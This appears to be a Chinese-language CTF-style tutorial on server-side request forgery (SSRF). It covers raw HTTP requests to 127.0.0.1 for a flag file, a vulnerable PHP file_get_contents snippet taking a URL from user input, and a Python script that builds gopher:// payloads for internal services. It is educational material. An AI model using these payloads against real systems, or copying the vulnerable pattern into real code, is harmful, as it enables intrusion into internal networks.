服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞**以服务器的身份发送一条构造好的请求**给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。

例如：我们的服务器向我们的用户开放了我们的 80 端口，但是没有开放我们的 3306 端口，（3306 端口涉及到我们的数据库服务器）。这个时候，如果我们能够控制我们的**80 端口的**webshell，那么我们就可以通过我们的**80 端口与 3306 端口**之间的对话，来获取我们需要的信息。

甚至可以去请求我们的**内部网站**。

## SSRF 到底是什么
我们的 SSRF，其实就是**利用我们控制的一个可以向内部发送网络请求的函数，或者主机**，然后利用这一个主机来发送我们想要的内容，而我们的这一个内容，**通常来说需要符合我们的 http 协议**。因此，我们可以考虑现在我们的 burpsuit 上

例如：发送一个本地端口的数据，要求访问我们本地的/flag 文件：
```
"GET /flag.php HTTP/1.1\r\n"
"HOST:127.0.0.1\r\n"
"Connection: Keep-Alive\r\n\r\n"
```

这个时候，我们的构造思路是：利用我们的 burpsuit 来生成对应的请求作为我们的直接数据。**注意，我们要把最后一个元素重复一次\r\n**
```
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```


## 利用条件：
1. 存在我们的 `file_get_contents` 函数，我们这一个函数不仅可以读取一个文件，还可以**读取 http 请求**
```
$url=$_GET['url']
echo file_get_contents($url)
```



## 攻击内网服务：
Gopher 协议：
Gopher 是一个互联网上的非常有名的信息查找系统，他将 internet 上的文件组织成某种索引。在 www出现之前 ，Gopher 就相当于我们的 www协议 。

利用这一个歇息可以实现做到向我们的某一个地址发送对印度个数据，格式如下：
```
gopher://地址:端口/_数据包
```

这个时候，我们就可以做到，想法什么包就发什么包。


### 数据包构造
第一步：写好原始数据（TCP 报文）
第二步：把换行符 `'\n'` 换成 `'\r\n'`
第三步：将原始数据包进行 url 编码，然后放在 `gopher://地址:port/_` 的后面。

```
from urllib.parse import quote as urlencode

  

def makegopher():

    raw="""GET/ HTTP/1.1

HOST:127.0.0.1:1234

User_Agent:curl/7.77.0

Accept:*/*

    """.replace('\n','\r\n')

    stream=urlencode(raw)

    return "gopher://127.0.0.1:1234/_"+stream

print(makegopher())

```
